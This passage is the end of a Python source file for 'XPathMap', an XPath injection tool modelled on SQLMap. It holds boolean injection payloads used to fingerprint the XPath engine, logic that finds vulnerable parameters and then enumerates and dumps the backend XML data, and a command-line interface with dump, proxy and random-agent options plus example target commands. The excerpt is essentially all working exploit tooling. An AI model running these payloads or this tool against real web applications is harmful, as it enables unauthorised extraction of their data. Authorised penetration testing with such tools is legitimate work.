        print(f"\n{Fore.CYAN}[*] XPath engine fingerprint{Style.RESET_ALL}")

        # Check XPath 2.0 function availability (Saxon / .NET / BaseX)
        checks = {
            "XPath 2.0 (string-to-codepoints)":
                "' or string-to-codepoints('A')=65 or '",
            "XPath 1.0 (string-length)":
                "' or string-length('test')=4 or '",
            "XPath 1.0 (translate)":
                "' or translate('abc','a','A')='Abc' or '",
            "supports count()":
                "' or count(/)=1 or '",
            "supports name()":
                "' or string-length(name(/*[1]))>0 or '",
        }
        results = {}
        for feat, pl in checks.items():
            r = self._send(param, pl)
            detected = r is not None and self._is_true(r)
            results[feat] = detected
            icon = f"{Fore.GREEN}YES{Style.RESET_ALL}" if detected else f"{Fore.RED}NO{Style.RESET_ALL}"
            print(f"  {feat}: {icon}")
        return results

    # ─────────────────────────── runner ─────────────────────────────────────

    def run(self):
        print(BANNER2)

        # Show session info
        self._log(0, f"Session/output dir: {Fore.YELLOW}{self.cache.path}{Style.RESET_ALL}")
        if getattr(self.args, "flush_session", False):
            self._log(2, "Session flushed — starting fresh")

        # Baseline
        self._log(0, f"Target: {self.url}")
        self._log(0, "Establishing baseline...")
        self.baseline_resp = self._send_raw()
        if not self.baseline_resp:
            self._log(2, "Cannot reach target!", Fore.RED)
            sys.exit(1)
        self._log(1, f"Status {self.baseline_resp.status_code} | "
                     f"Size {len(self.baseline_resp.text)} bytes")

        if not self.params:
            self._log(2, "No parameters found. Provide URL with params or --data.")
            sys.exit(1)

        self._log(0, f"Testing {len(self.params)} parameter(s): "
                     f"{', '.join(p['name'] for p in self.params)}")

        # Detect injection
        for p in self.params:
            itype = self.detect(p)
            if itype:
                self.inject_type = itype
                self.injectable_params.append((p, itype))
                self._log(1,
                    f"Parameter '{p['name']}' is VULNERABLE ({itype}-based XPath injection)",
                    Fore.GREEN)
                break  # Use first injectable param by default
            else:
                self._log(0, f"'{p['name']}' appears not injectable")

        if not self.injectable_params:
            self._log(2,
                "No injectable parameters found. "
                "Try --level/--risk, --prefix/--suffix, or verify manually.",
                Fore.RED)
            sys.exit(1)

        param, itype = self.injectable_params[0]
        self._log(1, f"Using parameter '{param['name']}' for extraction")

        # Always calibrate boolean indicators for blind extraction
        self._calibrate_boolean(param)

        # Dispatch actions
        acted        = False
        dumped_tables = []   # (db, table, rows) — collected for final summary

        if self.args.fingerprint:
            self.fingerprint(param)
            acted = True

        if self.args.dbs:
            self.get_dbs(param)
            acted = True

        if self.args.tables:
            self.get_tables(param)
            acted = True

        if self.args.columns:
            self.get_columns(param)
            acted = True

        if self.args.dump:
            rows = self.dump(param)
            if rows:
                dumped_tables.append((self.args.D or "", self.args.T or "", rows))
            acted = True

        if self.args.dump_all:
            dumped_tables = self.dump_all(param)
            acted = True

        # ── Final summary ────────────────────────────────────────────────────
        if dumped_tables:
            self._print_final_summary(dumped_tables)

        if not acted:
            self._log(1, "Injection detected! Use one of these to extract data:")
            print(f"""
  {Fore.CYAN}--dbs{Style.RESET_ALL}          Enumerate root XML nodes
  {Fore.CYAN}--tables{Style.RESET_ALL}       Enumerate child nodes  (use -D <root>)
  {Fore.CYAN}--columns{Style.RESET_ALL}      Enumerate attributes/elements  (use -D -T)
  {Fore.CYAN}--dump{Style.RESET_ALL}         Dump records  (use -D -T, optionally -C)
  {Fore.CYAN}--dump-all{Style.RESET_ALL}     Dump everything
  {Fore.CYAN}--fingerprint{Style.RESET_ALL}  Identify XPath engine
""")


# ─────────────────────────── argument parsing ───────────────────────────────

def build_parser():
    p = argparse.ArgumentParser(
        prog="xpathmap",
        description="XPathMap - XPath Injection Testing Tool (SQLMap-compatible syntax)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  xpathmap.py -u "http://target.local/search?q=test" --dbs
  xpathmap.py -u "http://target.local/login" --data "user=test&pass=x" -p user --dump
  xpathmap.py -u "http://target.local/api?id=1" --tables -D books
  xpathmap.py -u "http://target.local/api?id=1" --dump -D books -T book -C "@id,title,author"
  xpathmap.py -r request.txt --dbs
  xpathmap.py -r request.txt -p username --dump -D store -T users
        """
    )

    # ── Target ───────────────────────────────────────────────────────────────
    tg = p.add_argument_group("Target")
    tg.add_argument("-u", "--url",          metavar="URL",
                    help="Target URL (e.g. http://host/page?id=1)")
    tg.add_argument("-d", "--data",         metavar="DATA",
                    help="POST data string (url-encoded or JSON)")
    tg.add_argument("--cookie",             metavar="COOKIE",
                    help="HTTP Cookie header value")
    tg.add_argument("-H", "--headers",      metavar="HEADERS",
                    help="Extra HTTP headers separated by \\n")
    tg.add_argument("--user-agent",         metavar="AGENT",
                    help="Custom HTTP User-Agent")
    tg.add_argument("--random-agent",       action="store_true",
                    help="Use randomly selected HTTP User-Agent")
    tg.add_argument("-r", "--request-file",  metavar="FILE", dest="request_file",
                    help="Load raw HTTP request from file (Burp Suite format)")
    tg.add_argument("--proxy",              metavar="PROXY",
                    help="HTTP proxy (e.g. http://127.0.0.1:8080)")

    # ── Request ──────────────────────────────────────────────────────────────
    rq = p.add_argument_group("Request")
    rq.add_argument("-p", "--param",        metavar="PARAM",
                    help="Testable parameter(s), comma-separated")
    rq.add_argument("--timeout",            type=int, default=30, metavar="SECONDS",
                    help="Seconds to wait before timeout (default 30)")
    rq.add_argument("--delay",              type=float, default=0, metavar="SECONDS",
                    help="Delay between each HTTP request (default 0)")
    rq.add_argument("--retries",            type=int, default=3, metavar="N",
                    help="Retries when connection timeouts (default 3)")

    # ── Optimization ─────────────────────────────────────────────────────────
    op = p.add_argument_group("Optimization")
    op.add_argument("--level",              type=int, default=1, choices=range(1, 6),
                    metavar="LEVEL",
                    help="Level of tests to perform (1-5, default 1)")
    op.add_argument("--risk",               type=int, default=1, choices=range(1, 4),
                    metavar="RISK",
                    help="Risk of tests to perform (1-3, default 1)")
    op.add_argument("--threads",            type=int, default=1, metavar="N",
                    help="Max concurrent HTTP requests (default 1)")
    op.add_argument("--batch",              action="store_true",
                    help="Never ask for user input, use defaults")
    op.add_argument("--time-sec",           type=int, default=5, metavar="SECONDS",
                    dest="time_sec",
                    help="Seconds for time-based blind detection (default 5)")

    # ── Injection ────────────────────────────────────────────────────────────
    inj = p.add_argument_group("Injection")
    inj.add_argument("--technique",         metavar="TECH", default="BET",
                     help="Techniques: B=Boolean, E=Error, T=Time (default BET)")
    inj.add_argument("--prefix",            metavar="PREFIX",
                     help="Injection payload prefix")
    inj.add_argument("--suffix",            metavar="SUFFIX",
                     help="Injection payload suffix")

    # ── Detection ────────────────────────────────────────────────────────────
    det = p.add_argument_group("Detection")
    det.add_argument("--string",            metavar="STRING",
                     help="String to match when condition is True")
    det.add_argument("--not-string",        metavar="STRING", dest="not_string",
                     help="String present when condition is False")
    det.add_argument("--regexp",            metavar="REGEXP",
                     help="Regexp to match for True response")
    det.add_argument("--code",              type=int, metavar="CODE",
                     help="HTTP status code indicating True")

    # ── Enumeration ──────────────────────────────────────────────────────────
    en = p.add_argument_group("Enumeration")
    en.add_argument("--dbs",                action="store_true",
                    help="Enumerate root XML nodes (like --dbs in sqlmap)")
    en.add_argument("--tables",             action="store_true",
                    help="Enumerate child nodes under root (like --tables)")
    en.add_argument("--columns",            action="store_true",
                    help="Enumerate attributes/elements (like --columns)")
    en.add_argument("--dump",               action="store_true",
                    help="Dump XML node data")
    en.add_argument("--dump-all",           action="store_true", dest="dump_all",
                    help="Dump all XML data")
    en.add_argument("--fingerprint",        action="store_true",
                    help="Identify XPath engine/version")
    en.add_argument("-D",                   metavar="DB",
                    help="Root XML node to target (like -D in sqlmap)")
    en.add_argument("-T",                   metavar="TABLE",
                    help="Child XML node to target (like -T in sqlmap)")
    en.add_argument("-C",                   metavar="COLUMNS",
                    help="Attributes/elements to extract, comma-separated")
    en.add_argument("--start",              type=int, metavar="N",
                    help="First record index to retrieve (default 1)")
    en.add_argument("--stop",               type=int, metavar="N",
                    help="Last record index to retrieve")
    en.add_argument("--count",              type=int, metavar="N",
                    help="Number of records to retrieve")

    # ── Output ───────────────────────────────────────────────────────────────
    out = p.add_argument_group("Output")
    out.add_argument("-v", "--verbose",     action="count", default=0,
                     help="Verbosity: -v info, -vv warnings, -vvv debug")
    out.add_argument("--output-dir",        metavar="PATH", dest="output_dir",
                     help="Custom output directory (default ~/.xpathmap/output/<host>/)")
    out.add_argument("--flush-session",     action="store_true", dest="flush_session",
                     help="Clear session cache and start fresh for this target")
    out.add_argument("--fresh-queries",     action="store_true", dest="flush_session",
                     help="Alias for --flush-session (SQLMap compatible)")

    return p


def main():
    parser = build_parser()
    args   = parser.parse_args()

    if not args.url and not getattr(args, "request_file", None):
        parser.error("one of -u/--url or -r/--request-file is required")

    # If -r used without -u, set a dummy url (will be overridden in __init__)
    if not args.url:
        args.url = "http://placeholder"

    tool = XPathMap(args)
    try:
        tool.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}")
        sys.exit(0)


if __name__ == "__main__":
    main()
